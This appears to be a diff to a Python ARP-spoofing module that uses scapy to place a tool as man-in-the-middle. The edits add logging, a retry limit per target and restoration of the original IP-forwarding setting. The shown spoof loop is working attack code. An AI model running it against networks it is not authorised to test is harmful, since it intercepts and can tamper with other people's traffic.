@@ -5,10 +5,12 @@ This module implements ARP spoofing to position the tool as man-in-the-middle.
 It includes clean ARP table restoration on exit for graceful cleanup.
 """
 
+import logging
 import time
-from typing import Optional, Set
 
 from scapy.all import ARP, getmacbyip, send
+
+logger = logging.getLogger(__name__)
 
 
 class ARPSpoofer:
@@ -19,7 +21,7 @@ class ARPSpoofer:
     and the gateway. It ensures clean restoration of ARP tables on exit.
     """
 
-    def __init__(self, targets: Set[str], gateway: str, interface: str, verbose: bool = False):
+    def __init__(self, targets: set[str], gateway: str, interface: str, verbose: bool = False):
         """
         Initialize the ARP spoofer.
 
@@ -34,8 +36,9 @@ class ARPSpoofer:
         self.interface = interface
         self.verbose = verbose
 
-        self.gateway_mac: Optional[str] = None
-        self.target_macs: dict = {}
+        self.gateway_mac: str | None = None
+        self.target_macs: dict[str, str] = {}
+        self._original_ip_forward: str | None = None
 
         self.running = False
         self.spoof_thread = None
@@ -115,8 +118,14 @@ class ARPSpoofer:
         This method sends periodic ARP packets to maintain the spoof.
         Should be called in a separate thread or loop.
         """
+        target_retries: dict[str, int] = dict.fromkeys(self.targets, 0)
+        max_retries = 3
+
         while self.running:
-            for target in self.targets:
+            for target in list(self.targets):
+                if target_retries[target] >= max_retries:
+                    continue  # Skip targets that have repeatedly failed
+
                 try:
                     # Tell target we are the gateway
                     arp_target = ARP(pdst=target, psrc=self.gateway, hwdst=self.target_macs[target])
@@ -126,12 +135,16 @@ class ARPSpoofer:
                     arp_gateway = ARP(pdst=self.gateway, psrc=target, hwdst=self.gateway_mac)
                     send(arp_gateway, verbose=False)
 
+                    target_retries[target] = 0  # Reset on success
+
                     if self.verbose:
                         print(f"Sent ARP spoof for {target} <-> {self.gateway}")
 
                 except Exception as e:
-                    if self.verbose:
-                        print(f"Error spoofing {target}: {e}")
+                    target_retries[target] += 1
+                    logger.warning(f"Error spoofing {target}: {e} (Retry {target_retries[target]}/{max_retries})")
+                    if target_retries[target] >= max_retries:
+                        logger.error(f"Max retries reached for {target}. Dropping from spoof loop.")
 
             time.sleep(2)  # Send every 2 seconds
 
@@ -184,29 +197,35 @@ class ARPSpoofer:
     def cleanup(self) -> None:
         """Cleanup resources."""
         self.stop()
-        self._disable_ip_forwarding()
+        self._restore_ip_forwarding()
 
     def _enable_ip_forwarding(self) -> None:
-        """Enable IP forwarding for MITM."""
+        """Enable IP forwarding for MITM, saving the original state."""
         try:
             # Linux
+            with open("/proc/sys/net/ipv4/ip_forward") as f:
+                self._original_ip_forward = f.read().strip()
+
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                 f.write("1")
             if self.verbose:
                 print("IP forwarding enabled")
         except Exception as e:
             if self.verbose:
-                print(f"Could not enable IP forwarding: {e}")
+                logger.warning(f"Could not enable IP forwarding: {e}")
 
-    def _disable_ip_forwarding(self) -> None:
-        """Disable IP forwarding."""
+    def _restore_ip_forwarding(self) -> None:
+        """Restore IP forwarding to its original state."""
+        if self._original_ip_forward is None:
+            return  # We never successfully read it
+
         try:
             # Linux
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                f.write("0")
+                f.write(self._original_ip_forward)
             if self.verbose:
-                print("IP forwarding disabled")
+                print(f"IP forwarding restored to: {self._original_ip_forward}")
         except Exception as e:
             if self.verbose:
-                print(f"Could not disable IP forwarding: {e}")
+                logger.warning(f"Could not restore IP forwarding: {e}")
 
